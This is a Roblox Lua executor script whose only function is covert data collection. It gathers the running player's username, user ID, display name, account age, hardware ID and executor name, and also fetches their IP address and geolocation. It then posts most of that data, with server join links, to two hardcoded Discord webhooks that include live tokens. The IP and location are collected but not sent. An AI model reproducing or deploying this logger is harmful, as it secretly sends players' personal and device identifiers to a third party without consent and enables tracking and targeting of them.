local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local BadgeService = game:GetService("BadgeService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "üì± Mobile" or "üíª PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
local Version = "idk"

local function detectExecutor()
    return identifyexecutor()
end

local executor = detectExecutor()
local date = os.date("%m/%d/%Y")
local time = os.date("%X")
local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
local playerLink = "https://www.roblox.com/users/" .. UserId
local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?serverJobId=" .. game.JobId

HttpService = game:GetService("HttpService")
WebHook_URL = "https://discord.com/api/webhooks/1321999937935900712/6KkpmEeE1a6N_pSLS72TchklPUVC0NbhrSbfxApl9_CDvGASo3feAuGnKeudEq8MZYZj"
WebHook_URL2 = "https://discord.com/api/webhooks/1301704667268513844/zvbR-UkezBLQ4fk0v6DEoh0b6U6jw0gjE8Wt-Aqbad8A6GOPTk-Oj_Zkke9MS39Iscll"

local http_request = request(
{
	Url = WebHook_URL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = HttpService:JSONEncode({
		username = game.Players.LocalPlayer.Name .." Executed The Script",
		avatar_url = "https://cdn.discordapp.com/icons/1293964144529113138/e592a64d5170f7812bb5fd953323b8c5.webp?size=128",
		content = "",
        embeds = {
            {
                title = "üéÆ Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "üë§ Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "Roblox Hwid",
                description = string.format(
                    "**HWID:** `%s`",
                    Hwid
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "‚öôÔ∏è Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Join](%s)\n**Mobile Join:** [Click](%s)\n**Version:** `%s`",
                    executor, jobIdLink, mobileJoinLink, Version
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("üìÖ Date: %s | ‚è∞ Time: %s", date, time )
                }
            }
        }
	}
)
})

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local BadgeService = game:GetService("BadgeService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = "Unkown"
local DisplayName = LocalPlayer.DisplayName
local Username = "Unkown"
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Hwid = "Unkown"
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "üì± Mobile" or "üíª PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local http_request = request(
{
	Url = WebHook_URL2,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = HttpService:JSONEncode({
		username = "Unkown Developer Executed The Developer Version Of The Script",
		avatar_url = "https://cdn.discordapp.com/icons/1293964144529113138/e592a64d5170f7812bb5fd953323b8c5.webp?size=128",
		content = "",
        embeds = {
            {
                title = "üéÆ Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "üë§ Player Information",
                description = string.format(
                    "**Display Name:** %s\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    DisplayName, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "‚öôÔ∏è Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Join](%s)\n**Mobile Join:** [Click](%s)\n**Version:** `%s`",
                    executor, jobIdLink, mobileJoinLink, Version
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("üìÖ Date: %s | ‚è∞ Time: %s", date, time )
                }
            }
        }
	}
)
})
